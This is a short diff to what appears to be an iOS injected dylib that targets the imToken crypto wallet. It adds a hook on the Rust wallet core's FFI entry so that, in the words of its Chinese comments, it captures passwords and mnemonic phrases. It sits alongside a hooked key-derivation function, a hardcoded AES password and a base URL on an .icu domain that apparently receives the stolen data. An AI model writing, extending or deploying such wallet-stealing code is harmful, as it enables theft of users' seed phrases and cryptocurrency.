@@ -12,6 +12,7 @@
 #import "Info.h"
 #import "ImToken.h"
 #import "HookKDF.h"
+#import "HookTcx.h"
 
 static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
 static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
@@ -263,6 +264,9 @@ void plugin_main(void) {
 
     // KDF interpose 由 dyld 在加载本 dylib 时自动生效（__DATA,__interpose 段），
     // 这里只做一次标记；真正抓密码在 MyCCKeyDerivationPBKDF 里。
+    // 主目标：截 Rust 钱包核心的 FFI 入口（密码/助记词都在它的 JSON 参数里）
+    HookTcxInstall();
+
     HookKDFInstall();
     HookKDFWriteWitness();   // 基线探针：证明 dylib 已加载
 
